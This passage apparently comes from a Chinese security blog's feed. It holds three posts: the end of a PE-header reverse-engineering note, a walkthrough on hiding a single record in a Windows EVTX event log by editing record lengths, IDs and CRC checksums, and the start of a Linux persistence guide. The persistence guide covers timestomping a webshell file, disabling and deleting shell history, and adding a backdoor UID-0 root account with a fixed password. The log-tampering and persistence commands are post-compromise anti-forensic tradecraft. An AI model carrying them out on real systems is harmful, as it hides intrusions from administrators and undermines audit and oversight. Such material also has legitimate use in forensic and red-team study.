<h5 id="3-åœ¨ODä¸­å»å¯¹ç…§æŸ¥çœ‹åœ°å€"><a href="#3-åœ¨ODä¸­å»å¯¹ç…§æŸ¥çœ‹åœ°å€" class="headerlink" title="3.åœ¨ODä¸­å»å¯¹ç…§æŸ¥çœ‹åœ°å€"></a>3.åœ¨ODä¸­å»å¯¹ç…§æŸ¥çœ‹åœ°å€</h5><p><img src="/posts/d8527941/12.png"></p>
<p>æ ·æœ¬3ä¸­ </p>
<p><code>AddressOfEntryPoint</code>  ç¨‹åºè™šæ‹Ÿå…¥å£åœ°å€ä¸º   <code>0x0002AE57h</code></p>
<p><code>BaseOfCode</code>  ä»£ç åŸºå€ä¸º <code>0x00001000h</code></p>
<p><code>BaseOfData</code>  æ•°æ®åŸºå€ä¸º <code>0x0003F000h</code></p>
<p><code>ImageBase</code>  ä¸º <code>0x10000000h</code></p>
<p>ä½¿ç”¨ODæ‰“å¼€å ç¬¬ä¸€è¡Œä¸º <code>AE57</code>  å³ ç¨‹åºçš„è™šæ‹Ÿå…¥å£åœ°å€</p>
<p><img src="/posts/d8527941/13.png"></p>
<p>ç¬¬ä¸€è¡Œçš„åœ°å€ä¸º 1000h  å³BaseOfCode ï¼ˆä»£ç åŸºå€åœ°å€ï¼‰</p>
<p>å‰é¢ä¸º1000 0000h å³ ImageBaseï¼ˆdllé»˜è®¤ä¸º 0x10000000hï¼‰</p>
]]></content>
  </entry>
  <entry>
    <title>ç—•è¿¹æ¸…ç†-Windowsç¯‡-02</title>
    <url>/posts/41ffc4f2/</url>
    <content><![CDATA[<p>å•æ¡æ—¥å¿—æ¸…ç†</p>
<p> å‚è€ƒä¸‰å¥½å¤§ä½¬çš„æ–‡ç«  </p>
<p><a href="https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B">https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B</a></p>
<h3 id="evtxåŸºç¡€çŸ¥è¯†"><a href="#evtxåŸºç¡€çŸ¥è¯†" class="headerlink" title="evtxåŸºç¡€çŸ¥è¯†"></a>evtxåŸºç¡€çŸ¥è¯†</h3><p>å‚è€ƒ<code> https://github.com/libyal/libevtx/blob/main/documentation/Windows XML Event Log (EVTX).asciidoc</code> </p>
<p>evtxæ–‡ä»¶ç»“æ„åŒ…å«3éƒ¨åˆ†</p>
<ul>
<li>file header</li>
<li>chunks</li>
<li>trailing empty values</li>
</ul>
<h4 id="file-header"><a href="#file-header" class="headerlink" title="file header"></a>file header</h4><p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header</a></p>
<h3 id="chunks"><a href="#chunks" class="headerlink" title="chunks"></a>chunks</h3><p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk</a></p>
<h4 id="trailing-empty-values"><a href="#trailing-empty-values" class="headerlink" title="trailing empty values"></a>trailing empty values</h4><p><a href="https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#32-event-record">https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#32-event-record</a></p>
<h3 id="å…·ä½“æ“ä½œ"><a href="#å…·ä½“æ“ä½œ" class="headerlink" title="å…·ä½“æ“ä½œ"></a>å…·ä½“æ“ä½œ</h3><h4 id="æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶"><a href="#æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶"></a>æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶</h4><ul>
<li>ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹</li>
</ul>
<p><img src="/posts/41ffc4f2/1.png"></p>
<p>è¿™é‡Œè¦åˆ é™¤çš„è®°å½•ä¸º1915</p>
<p>åˆ é™¤åæ•ˆæœå¦‚ä¸‹</p>
<p><img src="/posts/41ffc4f2/2.png"></p>
<ul>
<li>ä½¿ç”¨pythonè„šæœ¬æŸ¥çœ‹</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨è¯¥å·¥å…· <a href="https://github.com/williballenthin/python-evtx">https://github.com/williballenthin/python-evtx</a></p>
<p><code>python evtx_record_structure.py System.evtx 1915</code></p>
<p><img src="/posts/41ffc4f2/3.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\TEST\Desktop&gt;python evtx_record_structure.py System.evtx 1915</span><br><span class="line">00000000: 2A 2A 00 00 38 01 00 00  7B 07 00 00 00 00 00 00  **..8...&#123;.......</span><br><span class="line">00000010: 23 EB 07 A2 D4 FB D3 01  0F 01 01 00 0C 01 65 CE  #.............e.</span><br><span class="line">00000020: 1B C7 EE 0D 00 00 14 00  00 00 01 00 04 00 01 00  ................</span><br><span class="line">00000030: 04 00 02 00 06 00 02 00  06 00 02 00 06 00 08 00  ................</span><br><span class="line">00000040: 15 00 08 00 11 00 00 00  00 00 04 00 08 00 04 00  ................</span><br><span class="line">00000050: 08 00 08 00 0A 00 01 00  04 00 00 00 00 00 00 00  ................</span><br><span class="line">00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000070: 00 00 00 00 00 00 8B 00  21 00 04 00 00 00 7C 1B  ........!.....|.</span><br><span class="line">00000080: 00 40 00 00 00 00 00 00  80 80 23 EB 07 A2 D4 FB  .@........#.....</span><br><span class="line">00000090: D3 01 D8 01 00 00 9C 07  00 00 7B 07 00 00 00 00  ..........&#123;.....</span><br><span class="line">000000A0: 00 00 00 0F 01 01 00 0C  01 DE E1 DC 34 6C 11 00  ............4l..</span><br><span class="line">000000B0: 00 04 00 00 00 4E 00 01  00 08 00 01 00 04 00 08  .....N..........</span><br><span class="line">000000C0: 00 0E 00 0E 00 42 00 61  00 63 00 6B 00 67 00 72  .....B.a.c.k.g.r</span><br><span class="line">000000D0: 00 6F 00 75 00 6E 00 64  00 20 00 49 00 6E 00 74  .o.u.n.d. .I.n.t</span><br><span class="line">000000E0: 00 65 00 6C 00 6C 00 69  00 67 00 65 00 6E 00 74  .e.l.l.i.g.e.n.t</span><br><span class="line">000000F0: 00 20 00 54 00 72 00 61  00 6E 00 73 00 66 00 65  . .T.r.a.n.s.f.e</span><br><span class="line">00000100: 00 72 00 20 00 53 00 65  00 72 00 76 00 69 00 63  .r. .S.e.r.v.i.c</span><br><span class="line">00000110: 00 65 00 63 6B 28 57 D0  8F 4C 88 0E 00 00 00 42  .e.ck(W..L.....B</span><br><span class="line">00000120: 00 49 00 54 00 53 00 2F  00 34 00 00 00 00 00 00  .I.T.S.&#x2F;.4......</span><br><span class="line">00000130: 15 00 00 00 38 01 00 00                           ....8...</span><br><span class="line">record(absolute_offset&#x3D;8776)</span><br><span class="line">RootNode(offset&#x3D;0x18)</span><br><span class="line">  StreamStartNode(offset&#x3D;0x18)</span><br><span class="line">  TemplateInstanceNode(offset&#x3D;0x1c, resident&#x3D;False)</span><br><span class="line">  Substitutions(offset&#x3D;0x26)</span><br><span class="line">    UnsignedByteTypeNode(offset&#x3D;0x7a) --&gt; 4</span><br><span class="line">    UnsignedByteTypeNode(offset&#x3D;0x7b) --&gt; 0</span><br><span class="line">    UnsignedWordTypeNode(offset&#x3D;0x7c) --&gt; 0</span><br><span class="line">    UnsignedWordTypeNode(offset&#x3D;0x7e) --&gt; 7036</span><br><span class="line">    UnsignedWordTypeNode(offset&#x3D;0x80) --&gt; 16384</span><br><span class="line">    Hex64TypeNode(offset&#x3D;0x82) --&gt; 0x8080000000000000</span><br><span class="line">    FiletimeTypeNode(offset&#x3D;0x8a) --&gt; 2018-06-04 07:21:19.394281</span><br><span class="line">    NullTypeNode(offset&#x3D;0x92)</span><br><span class="line">    UnsignedDwordTypeNode(offset&#x3D;0x92) --&gt; 472</span><br><span class="line">    UnsignedDwordTypeNode(offset&#x3D;0x96) --&gt; 1948</span><br><span class="line">    UnsignedQwordTypeNode(offset&#x3D;0x9a) --&gt; 1915</span><br><span class="line">    UnsignedByteTypeNode(offset&#x3D;0xa2) --&gt; 0</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    BXmlTypeNode(offset&#x3D;0xa3) --&gt;</span><br><span class="line">      RootNode(offset&#x3D;0xa3)</span><br><span class="line">        StreamStartNode(offset&#x3D;0xa3)</span><br><span class="line">        TemplateInstanceNode(offset&#x3D;0xa7, resident&#x3D;False)</span><br><span class="line">        Substitutions(offset&#x3D;0xb1)</span><br><span class="line">          WstringTypeNode(offset&#x3D;0xc5) --&gt; Background Intelligent Transfer Servi</span><br><span class="line">ce</span><br><span class="line">          WstringTypeNode(offset&#x3D;0x113) --&gt; æ­£åœ¨è¿è¡Œ</span><br><span class="line">          UnsignedDwordTypeNode(offset&#x3D;0x11b) --&gt; 14</span><br><span class="line">          BinaryTypeNode(offset&#x3D;0x11f) --&gt; QgBJAFQAUwAvADQAAAA&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Event xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;win&#x2F;2004&#x2F;08&#x2F;events&#x2F;event&quot;&gt;&lt;System&gt;&lt;Pr</span><br><span class="line">ovider Name&#x3D;&quot;Service Control Manager&quot; Guid&#x3D;&quot;&#123;555908d1-a6d7-4695-8e1e-26931d2012f</span><br><span class="line">4&#125;&quot; EventSourceName&#x3D;&quot;Service Control Manager&quot;&gt;&lt;&#x2F;Provider&gt;</span><br><span class="line">&lt;EventID Qualifiers&#x3D;&quot;16384&quot;&gt;7036&lt;&#x2F;EventID&gt;</span><br><span class="line">&lt;Version&gt;0&lt;&#x2F;Version&gt;</span><br><span class="line">&lt;Level&gt;4&lt;&#x2F;Level&gt;</span><br><span class="line">&lt;Task&gt;0&lt;&#x2F;Task&gt;</span><br><span class="line">&lt;Opcode&gt;0&lt;&#x2F;Opcode&gt;</span><br><span class="line">&lt;Keywords&gt;0x8080000000000000&lt;&#x2F;Keywords&gt;</span><br><span class="line">&lt;TimeCreated SystemTime&#x3D;&quot;2018-06-04 07:21:19.394281&quot;&gt;&lt;&#x2F;TimeCreated&gt;</span><br><span class="line">&lt;EventRecordID&gt;1915&lt;&#x2F;EventRecordID&gt;</span><br><span class="line">&lt;Correlation ActivityID&#x3D;&quot;&quot; RelatedActivityID&#x3D;&quot;&quot;&gt;&lt;&#x2F;Correlation&gt;</span><br><span class="line">&lt;Execution ProcessID&#x3D;&quot;472&quot; ThreadID&#x3D;&quot;1948&quot;&gt;&lt;&#x2F;Execution&gt;</span><br><span class="line">&lt;Channel&gt;System&lt;&#x2F;Channel&gt;</span><br><span class="line">&lt;Computer&gt;WIN-E8C6J8CN50O&lt;&#x2F;Computer&gt;</span><br><span class="line">&lt;Security UserID&#x3D;&quot;&quot;&gt;&lt;&#x2F;Security&gt;</span><br><span class="line">&lt;&#x2F;System&gt;</span><br><span class="line">&lt;EventData&gt;&lt;Data Name&#x3D;&quot;param1&quot;&gt;Background Intelligent Transfer Service&lt;&#x2F;Data&gt;</span><br><span class="line">&lt;Data Name&#x3D;&quot;param2&quot;&gt;&amp;#27491;&amp;#22312;&amp;#36816;&amp;#34892;&lt;&#x2F;Data&gt;</span><br><span class="line">&lt;Binary&gt;QgBJAFQAUwAvADQAAAA&#x3D;&lt;&#x2F;Binary&gt;</span><br><span class="line">&lt;&#x2F;EventData&gt;</span><br><span class="line">&lt;&#x2F;Event&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="åˆ é™¤å•æ¡æ—¥å¿—æ€è·¯â€”â€”è¦†ç›–"><a href="#åˆ é™¤å•æ¡æ—¥å¿—æ€è·¯â€”â€”è¦†ç›–" class="headerlink" title="åˆ é™¤å•æ¡æ—¥å¿—æ€è·¯â€”â€”è¦†ç›–"></a>åˆ é™¤å•æ¡æ—¥å¿—æ€è·¯â€”â€”è¦†ç›–</h4><p>ä¿®æ”¹æ—¥å¿— Event Record sizeé•¿åº¦ï¼Œç„¶åè¦†ç›–æ‰ä¸‹ä¸€æ¡æ—¥å¿—ï¼Œè¿™æ ·windowsåœ¨è§£ææ—¥å¿—æ—¶ï¼Œä¸‹ä¸€æ¡æ—¥å¿—å°±ä¼šè¢«éšè—ï¼Œä»è€Œå®ç°æ‰€è°“çš„å•æ¡ç›®å½•çš„åˆ é™¤</p>
<p><img src="/posts/41ffc4f2/4.png" alt="ä»å¤§ä½¬é‚£é‡ŒæŠ„çš„å›¾"></p>
<p>å…·ä½“æ–¹æ³•:</p>
<ul>
<li><p>1.file headerä¸­çš„Next record identifierå‡ä¸€</p>
</li>
<li><p>2.é‡æ–°è®¡ç®—file header ä¸­çš„ chunksum</p>
</li>
<li><p>3.ä¿®æ”¹Event Record:</p>
<p>é‡æ–°è®¡ç®—å¾…åˆ é™¤Event Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event Recordçš„Event record identifier</p>
</li>
<li><p>4.æ›´æ–°ElfChnkï¼Œ</p>
</li>
</ul>
<h4 id="åˆ é™¤å•æ¡æ—¥å¿—çš„å®ä¾‹"><a href="#åˆ é™¤å•æ¡æ—¥å¿—çš„å®ä¾‹" class="headerlink" title="åˆ é™¤å•æ¡æ—¥å¿—çš„å®ä¾‹"></a>åˆ é™¤å•æ¡æ—¥å¿—çš„å®ä¾‹</h4><p>å®ä¾‹æ ·æœ¬ <a href="https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/System.evtx">https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/System.evtx</a></p>
<h5 id="File-header-Next-record-identifierå€¼-1"><a href="#File-header-Next-record-identifierå€¼-1" class="headerlink" title="File header   Next record identifierå€¼ -1"></a>File header   Next record identifierå€¼ -1</h5><p>è¿™é‡Œé‡‡ç”¨å°ç«¯åº 0x077c  å‡ä¸€åä¸º 0x77b</p>
<p><img src="/posts/41ffc4f2/5.png" alt="ä¿®æ”¹å"></p>
<h5 id="é‡æ–°è®¡ç®—checksumå€¼"><a href="#é‡æ–°è®¡ç®—checksumå€¼" class="headerlink" title="é‡æ–°è®¡ç®—checksumå€¼"></a>é‡æ–°è®¡ç®—checksumå€¼</h5><p><img src="/posts/41ffc4f2/6.png" alt="åŸå€¼"></p>
<p>è®¡ç®—å‰120bytes çš„ CRC32ï¼Œç›´æ¥å¼•ç”¨å¤§ä½¬çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc2hex</span>(<span class="params">crc</span>):</span>   </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%08x&#x27;</span> % (binascii.crc32(binascii.a2b_hex(crc)) &amp; <span class="number">0xffffffff</span>)     </span><br><span class="line"></span><br><span class="line">d=<span class="string">&#x27;456C6646696C6500000000000000000000000000000000007B0700000000000080000000010003000010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>  </span><br><span class="line">print(crc2hex(d)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœä¸º <code>ccc94756</code> ç„¶åè¿›è¡Œæ›¿æ¢ </p>
<p><img src="/posts/41ffc4f2/7.png"></p>
<h5 id="ä¿®æ”¹Event-Record"><a href="#ä¿®æ”¹Event-Record" class="headerlink" title="ä¿®æ”¹Event Record"></a>ä¿®æ”¹Event Record</h5><h5 id="é‡æ–°è®¡ç®—å¾…åˆ é™¤Event-Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event-Recordçš„Event-record-identifier"><a href="#é‡æ–°è®¡ç®—å¾…åˆ é™¤Event-Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event-Recordçš„Event-record-identifier" class="headerlink" title="é‡æ–°è®¡ç®—å¾…åˆ é™¤Event Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event Recordçš„Event record identifier"></a>é‡æ–°è®¡ç®—å¾…åˆ é™¤Event Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event Recordçš„Event record identifier</h5><p><img src="/posts/41ffc4f2/8.png"></p>
<p>Event recordå¤´ä¸º 0x2a\0x2a\0x00\0x00 åœ¨010editoræœç´¢ä¸€ä¸‹ æ‰¾åˆ°Event recordå¤´</p>
<p>é€”ä¸­çš„ 0x0778 å¯¹åº”å€¼ä¸º 1912 è¿™ä¸ªæ˜¯æ—¥å¿—ä¸­çš„ç¬¬ä¸€æ¡æ—¥å¿—ï¼Œè¿™é‡Œè¦åˆ é™¤1915 é‚£ä¹ˆå»æ‰¾åˆ°  0x077bå€¼å¯¹åº”çš„EventRecordï¼ˆç¬¬å››æ¡æ—¥å¿—ï¼‰</p>
<p><img src="/posts/41ffc4f2/10.png" alt="ç¬¬å››æ¡æ—¥å¿—"></p>
<p>é•¿åº¦ä¸º 0x0138h  EventRecord ID ä¸º 0x77bh(1915)</p>
<p>ç»“å°¾å¤„çš„å€¼ä¸ºEventRecord é•¿åº¦ 0x138h åœ¨åé¢éœ€è¦è¦†ç›–åä¹Ÿè¦ä¿®æ”¹è¿™ä¸ªå€¼</p>
<p>å†æ‰¾åˆ°ç¬¬ä¸‰æ¡æ—¥å¿—</p>
<p><img src="/posts/41ffc4f2/11.png"></p>
<p>é•¿åº¦ä¸º 0x0480h EventRecord IDä¸º 0x77ah (1914)</p>
<p>æ‰¾åˆ°ä¸¤æ¡æ—¥å¿—å ä¿®æ”¹ä¸€ä¸‹ ç¬¬ä¸‰æ¡æ—¥å¿—çš„é•¿åº¦ ä½¿å…¶è¦†ç›–æ‰ç¬¬å››æ¡æ—¥å¿—</p>
<p>New_legth = 0x138h+0x480h=0x5b8h</p>
<p><img src="/posts/41ffc4f2/12.png"></p>
<p>ç„¶åæ›´æ–°ç¬¬å››æ¡æ—¥å¿—æœ€åé¢çš„é•¿åº¦ ä»0x138h æ”¹ä¸º 0x5b8h</p>
<p><img src="/posts/41ffc4f2/13.png"></p>
<h5 id="æ›´æ–°ElfChnk"><a href="#æ›´æ–°ElfChnk" class="headerlink" title="æ›´æ–°ElfChnk"></a>æ›´æ–°ElfChnk</h5><p><img src="/posts/41ffc4f2/15.png"></p>
<p><img src="/posts/41ffc4f2/16.png"></p>
<p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#31-chunk-header">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#31-chunk-header</a></p>
<p>åœ¨æµ‹è¯•æ—¥å¿—ä¸­åªæœ‰ä¸€ä¸ªElfchnk ä½†åˆ«çš„å¯èƒ½ä¼šæœ‰å¤šä¸ªElfChnk éœ€è¦æ‰¾åˆ°å¯¹åº”çš„ ElfChnk </p>
<p><img src="/posts/41ffc4f2/14.png"></p>
<p>ä¿®æ”¹<code>last Event record number</code>  0x04h -1 =  0x03h </p>
<p>ä¿®æ”¹<code>last Event record identifier</code> 0x77bh -1 = 0x77ah </p>
<p>ä¿®æ”¹<code>Last event record data offset</code>  0x1248h =&gt;  0xDC8h</p>
<p>ä¸ºç¬¬ä¸‰æ¡Event Record(æœ€åä¸€æ¡)ç›¸å¯¹äºElfChukçš„åç§»é•¿åº¦   </p>
<p>ElfChnk ä¸º 0x1000h ç¬¬ä¸‰æ¡å¼€å§‹ä½ç½®ä¸º 0x1DC8h  æ‰€ä»¥åç§»é‡ä¸º 0xDC8h</p>
<p>ä¿®æ”¹<code>Event records checksum</code> 0xD3D3DE43h =&gt;  0xF92FEDB9h</p>
<p><code>Event records checksum</code> ä¸ºæ‰€æœ‰Event records çš„æ ¡éªŒå’Œ è¿™é‡Œéœ€è¦è®¡ç®—ä¸‰æ¡çš„ </p>
<p>è®¡ç®—è¿‡ç¨‹ æŠ½æ—¶é—´ç®—ä¸€ä¸‹ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`</p>
<p>è®¡ç®—åä¸º <code>0xF92FEDB9h</code></p>
<p>ä¿®æ”¹<code> Checksum</code>  0xEB4C47BFh =&gt; 0x3CE0BF8h</p>
<p>è®¡ç®—å‰120 å’Œ128-512 å¤„çš„CRC32å€¼  ç»“æœä¸º <code>0x3CE0BF8h</code></p>
<p><img src="/posts/41ffc4f2/17.png"></p>
<p>å¦å­˜åæ‰“å¼€ å¯ä»¥çœ‹åˆ° ç¬¬å››æ¡æˆ‘ä»¬æƒ³è¦åˆ é™¤çš„æ—¥å¿—å·²ç»æˆåŠŸéšè—</p>
<p><img src="/posts/41ffc4f2/18.png"></p>
]]></content>
      <categories>
        <category>ç—•è¿¹æ¸…ç†</category>
      </categories>
      <tags>
        <tag>ç—•è¿¹æ¸…ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>æƒé™ç»´æŒ-Linuxç¯‡</title>
    <url>/posts/29801cba/</url>
    <content><![CDATA[<h3 id="Linuxæƒé™ç»´æŒ"><a href="#Linuxæƒé™ç»´æŒ" class="headerlink" title="Linuxæƒé™ç»´æŒ"></a>Linuxæƒé™ç»´æŒ</h3><h4 id="0x00-éšè—æŠ€å·§"><a href="#0x00-éšè—æŠ€å·§" class="headerlink" title="0x00 éšè—æŠ€å·§"></a>0x00 éšè—æŠ€å·§</h4><h5 id="ä¿®æ”¹æ–‡ä»¶-ç»ˆç«¯å±æ€§"><a href="#ä¿®æ”¹æ–‡ä»¶-ç»ˆç«¯å±æ€§" class="headerlink" title="ä¿®æ”¹æ–‡ä»¶/ç»ˆç«¯å±æ€§"></a>ä¿®æ”¹æ–‡ä»¶/ç»ˆç«¯å±æ€§</h5><p>ä¿®æ”¹æ–‡ä»¶çš„ç”Ÿæˆæ—¶é—´</p>
<p><code>touch -r index.php shell.php</code></p>
<p>touchå‘½ä»¤ç”¨äºä¿®æ”¹æ–‡ä»¶æˆ–è€…ç›®å½•çš„æ—¶é—´å±æ€§ï¼ŒåŒ…æ‹¬å­˜å–æ—¶é—´å’Œæ›´æ”¹æ—¶é—´ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œç³»ç»Ÿä¼šå»ºç«‹ä¸€ä¸ªæ–°çš„æ–‡ä»¶</p>
<h5 id="æ–‡ä»¶é”å®š"><a href="#æ–‡ä»¶é”å®š" class="headerlink" title="æ–‡ä»¶é”å®š"></a>æ–‡ä»¶é”å®š</h5><p>Linuxä¸­ä½¿ç”¨<code>chattr</code>å‘½ä»¤æ¥é˜²æ­¢rootå’Œå…¶ä»–ç®¡ç†ç”¨æˆ·è¯¯åˆ é™¤å’Œä¿®æ”¹é‡è¦æ–‡ä»¶ä»¥åŠç›®å½•ï¼Œæ­¤æƒé™æ˜¯ç”¨<code>ls -l</code>æŸ¥çœ‹ä¸å‡ºæ¥çš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chattr +i test.php #é”å®šæ–‡ä»¶</span><br><span class="line">rm -rf test.php #æç¤ºç¦æ­¢åˆ é™¤æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">lsattr test.php #å±æ€§æŸ¥çœ‹</span><br><span class="line">chattr -i test.php #è§£é™¤é”å®š</span><br><span class="line">rm -rf test.php #å½»åº•åˆ é™¤æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h5 id="å†å²æ“ä½œå‘½ä»¤"><a href="#å†å²æ“ä½œå‘½ä»¤" class="headerlink" title="å†å²æ“ä½œå‘½ä»¤"></a>å†å²æ“ä½œå‘½ä»¤</h5><p><code>[space]set +o history #å¤‡æ³¨ï¼š[space]è¡¨ç¤ºç©ºæ ¼ã€‚å¹¶ä¸”ç”±äºç©ºæ ¼çš„åŸå› ï¼Œè¯¥å‘½ä»¤æœ¬èº«ä¹Ÿä¸ä¼šè¢«è®°å½•ã€‚</code></p>
<p>ä¸Šé¢çš„å‘½ä»¤ä¼šä¸´æ—¶ç¦ç”¨å†å²åŠŸèƒ½ï¼Œå³æ‰§è¡Œåçš„å‘½ä»¤ä¸ä¼šè®°å½•åœ¨å†å²ä¸­</p>
<p><code>[space]set -o history #å°†ç¯å¢ƒæ¢å¤åŸçŠ¶</code></p>
<p>åˆ é™¤å†å²è®°å½•ä¸­çš„æŒ‡å®šå‘½ä»¤</p>
<p><code>history | grep &quot;keyword&quot;</code></p>
<p>è¾“å‡ºäº†å†å²è®°å½•ä¸­åŒ¹é…çš„å‘½ä»¤ï¼Œæ¯ä¸€æ¡å‰é¢ä¼šæœ‰ä¸ªæ•°å­—ã€‚ä»å†å²è®°å½•ä¸­åˆ é™¤é‚£ä¸ªæŒ‡å®šçš„é¡¹ï¼š</p>
<p><code>history -d [num] </code></p>
<p>å¤§è§„æ¨¡åˆ é™¤å†å²æ“ä½œè®°å½•</p>
<p><code>set -i &#39;150,$d&#39; .bash_history   #åªä¿ç•™å‰150è¡Œ</code></p>
<h4 id="0x01-æ·»åŠ ç”¨æˆ·"><a href="#0x01-æ·»åŠ ç”¨æˆ·" class="headerlink" title="0x01 æ·»åŠ ç”¨æˆ·"></a>0x01 æ·»åŠ ç”¨æˆ·</h4><h5 id="æ·»åŠ æ™®é€šç”¨æˆ·"><a href="#æ·»åŠ æ™®é€šç”¨æˆ·" class="headerlink" title="æ·»åŠ æ™®é€šç”¨æˆ·"></a>æ·»åŠ æ™®é€šç”¨æˆ·</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„æ™®é€šç”¨æˆ·</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"># useradd -p æ–¹æ³• &#96; &#96; æ˜¯ç”¨æ¥å­˜æ”¾å¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤,&quot;$()&quot;ä¹Ÿå¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œè¯­å¥</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"># chpasswdæ–¹æ³•</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"># echo -eæ–¹æ³•</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>

<h5 id="æ·»åŠ rootç”¨æˆ·"><a href="#æ·»åŠ rootç”¨æˆ·" class="headerlink" title="æ·»åŠ rootç”¨æˆ·"></a>æ·»åŠ rootç”¨æˆ·</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„rootç”¨æˆ·</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root</span><br><span class="line">-s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test</span><br></pre></td></tr></table></figure>

<h5 id="passwdå†™å…¥"><a href="#passwdå†™å…¥" class="headerlink" title="passwdå†™å…¥"></a>passwdå†™å…¥</h5><p>(æ³¨:ç°åœ¨è¾ƒæ–°çš„ç³»ç»Ÿæ— æ³•æˆåŠŸåˆ©ç”¨ åœ¨suåˆ‡æ¢ç”¨æˆ·æ—¶ä¼šæç¤ºç”¨æˆ·ä¸å­˜åœ¨)</p>
